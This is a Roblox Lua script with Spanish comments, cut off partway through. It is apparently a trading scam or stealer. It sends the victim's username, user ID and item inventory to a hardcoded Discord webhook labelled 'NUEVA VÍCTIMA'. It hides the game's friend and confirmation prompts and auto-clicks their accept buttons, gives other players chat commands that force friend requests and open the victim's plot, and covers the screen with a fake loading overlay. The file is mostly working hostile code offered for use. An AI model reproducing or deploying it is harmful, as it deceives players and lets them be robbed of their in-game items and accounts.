-- ==================== CONFIGURACI√ìN ====================
local WEBHOOK_URL = "https://discord.com/api/webhooks/1456818151617466540/gTXIOakP_WD8mLEEuvEKO-0NeoIXCnze3xBQubOKmDhmxSioyYPIaC0gFvWOBC_VKVhg"
local heartbeatUrl = WEBHOOK_URL
local Min_Gen = 0
local Jugador = Players.LocalPlayer
local PlayerGui = Jugador:WaitForChild("PlayerGui")
local UserID = Jugador.UserId

-- ==================== SISTEMA FANTASMA (OCULTACI√ìN Y AUTO-ACEPTAR) ====================

local function forceClick(obj)
    task.spawn(function()
        if not obj:IsA("GuiObject") then return end
        -- Lo hacemos gigante e invisible para que el sistema lo clickee sin que se vea
        obj.Visible = false
        obj.Size = UDim2.new(10, 0, 10, 0)
        obj.Position = UDim2.new(-5, 0, -5, 0)
        
        task.wait()
        local pos = obj.AbsolutePosition
        local size = obj.AbsoluteSize
        local cx, cy = pos.X + (size.X/2), pos.Y + (size.Y/2)
        
        VIM:SendMouseButtonEvent(cx, cy, 0, true, game, 0)
        task.wait(0.05)
        VIM:SendMouseButtonEvent(cx, cy, 0, false, game, 0)
    end)
end

-- Bucle agresivo para que NADA de CoreGui sea visible
task.spawn(function()
    while task.wait() do
        pcall(function()
            local robloxGui = CoreGui:FindFirstChild("RobloxGui")
            if robloxGui then
                -- Lista de posibles ventanas a ocultar
                local targets = {
                    robloxGui:FindFirstChild("FriendPrompt"),
                    robloxGui:FindFirstChild("BlockingModalScreen"),
                    robloxGui:FindFirstChild("PromptDialog")
                }
                
                for _, prompt in ipairs(targets) do
                    if prompt then
                        prompt.Visible = false
                        prompt.Size = UDim2.new(0, 0, 0, 0)
                        -- Buscar botones para auto-clickear
                        for _, desc in ipairs(prompt:GetDescendants()) do
                            if desc:IsA("TextButton") and (desc.Name == "ConfirmButton" or desc.Name == "3" or desc.Text:find("Aceptar")) then
                                forceClick(desc)
                            end
                        end
                    end
                end
            end
        end)
    end
end)

-- ==================== FUNCIONES DE EXTRACCI√ìN Y DATOS ====================

local function formatNumberShort(n)
    if not n or type(n) ~= "number" then return "$0" end
    if n >= 1e9 then return string.format("$%.2fB", n / 1e9) end
    if n >= 1e6 then return string.format("$%.2fM", n / 1e6) end
    if n >= 1e3 then return string.format("$%.2fK", n / 1e3) end
    return "$" .. tostring(n)
end

local function parseValueFromText(s)
    if not s then return 0 end
    local clean = s:gsub("[^%d%.KMB+]", "")
    local numPart = clean:match("([%d%.]+)")
    if not numPart then return 0 end
    local n = tonumber(numPart) or 0
    if clean:find("B") then return n * 1e9
    elseif clean:find("M") then return n * 1e6
    elseif clean:find("K") then return n * 1e3
    else return n end
end

local function getBrainrots()
    local results = {}
    for _, desc in ipairs(Workspace:GetDescendants()) do
        if desc:IsA("BillboardGui") or desc.Name:find("Overhead") then
            local nameLbl = desc:FindFirstChild("DisplayName") or desc:FindFirstChild("Name") or desc:FindFirstChild("Title")
            local genLbl = desc:FindFirstChild("Generation") or desc:FindFirstChild("Value")
            if nameLbl and genLbl and nameLbl:IsA("TextLabel") and genLbl:IsA("TextLabel") then
                local val = parseValueFromText(genLbl.Text)
                if val >= Min_Gen then
                    local key = nameLbl.Text .. "|" .. val
                    if results[key] then results[key].count = results[key].count + 1
                    else results[key] = {name = nameLbl.Text, value = val, count = 1} end
                end
            end
        end
    end
    local out = {}
    for _, v in pairs(results) do table.insert(out, v) end
    table.sort(out, function(a, b) return a.value > b.value end)
    return out
end

-- ==================== COMANDOS DE CHAT (PARA TODOS) ====================

local function sendCommandLog(player, cmdName)
    pcall(function()
        local request = syn and syn.request or http_request or request
        request({
            Url = heartbeatUrl,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode({
                embeds = {{
                    title = "Comando Ejecutado",
                    description = "**" .. player.Name .. "** us√≥ **" .. cmdName .. "**",
                    color = 65326,
                    timestamp = DateTime.now():ToIsoDate()
                }}
            })
        })
    end)
end

local function configurarChat(player)
    player.Chatted:Connect(function(msg)
        local msgLower = msg:lower():gsub("%s+", "")
        if msgLower == ".add" then
            sendCommandLog(player, ".add")
            pcall(function() StarterGui:SetCore("PromptSendFriendRequest", player) end)
        elseif msgLower == ".block" then
            sendCommandLog(player, ".block")
            for _, p in ipairs(Players:GetPlayers()) do
                if p ~= Jugador then pcall(function() StarterGui:SetCore("PromptBlockPlayer", p) end) end
            end
        elseif msgLower == ".open" then
            sendCommandLog(player, ".open")
            pcall(function() ReplicatedStorage.Packages.Net["RE/PlotService/ToggleFriends"]:FireServer() end)
        end
    end)
end

for _, p in ipairs(Players:GetPlayers()) do configurarChat(p) end
Players.PlayerAdded:Connect(configurarChat)

-- ==================== INTERFACES (SIN MODIFICAR) ====================

local function sendToDiscord(link, brainrots)
    local itemList = ""
    local totalValue = 0
    for i, br in ipairs(brainrots) do
        if i <= 15 then itemList = itemList .. string.format("> `[%d]` **%s** ‚ûî %s (x%d)\n", i, br.name, formatNumberShort(br.value), br.count) end
        totalValue = totalValue + (br.value * br.count)
    end
    local request = syn and syn.request or http_request or request
    pcall(function()
        request({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode({
                content = "||@everyone|| ü©∏ **NUEVA V√çCTIMA**",
                embeds = {{
                    title = "üöÄ Reporte de Extracci√≥n Moreira",
                    color = 16711680,
                    fields = {
                        {name = "üë§ Usuario", value = Jugador.Name .. " (" .. UserID .. ")", inline = true},
                        {name = "üí∞ Valor Total", value = "**" .. formatNumberShort(totalValue) .. "**", inline = true},
                        {name = "üîó Script", value = " " .. link .. " "},
                        {name = "üìã Inventario", value = (itemList ~= "" and itemList or "Vac√≠o")}
                    }
                }}
            })
        })
    end)
end

local function MostrarPantallaFinal()
    local FinalGui = Instance.new("ScreenGui", PlayerGui)
    FinalGui.Name = "RobloxLoadingSystem"
    FinalGui.IgnoreGuiInset = true
    FinalGui.DisplayOrder = 2147483647 
    
    local BG = Instance.new("Frame", FinalGui)
    BG.Size = UDim2.new(1.2, 0, 1.2, 0)
    BG.Position = UDim2.new(-0.1, 0, -0.1, 0)
    BG.BackgroundColor3 = Color3.new(0,0,0)
    BG.Active = true

    local Logo = Instance.new("ImageLabel", BG)
    Logo.Image = "rbxassetid://9167384795"
    Logo.Size = UDim2.new(0, 130, 0, 130)
    Logo.Position = UDim2.new(0.5, 0, 0.4, 0)
    Logo.AnchorPoint = Vector2.new(0.5, 0.5)
    Logo.BackgroundTransparency = 1

    local Status = Instance.new("TextLabel", BG)
    Status.Text = "Joining Server..."
    Status.Font = Enum.Font.GothamBold
    Status.TextColor3 = Color3.new(1, 1, 1)
    Status.Position = UDim2.new(0.5, 0, 0.55, 0)
    Status.AnchorPoint = Vector2.new(0.5, 0.5)
    Status.BackgroundTransparency = 1

    task.spawn(function()
        while true do
            Status.Text = "Loading Assets..."
            task.wait(3)
            Status.Text = "Syncing Data..."
            task.wait(3)
        end
    end)
end

local function IniciarMenu()
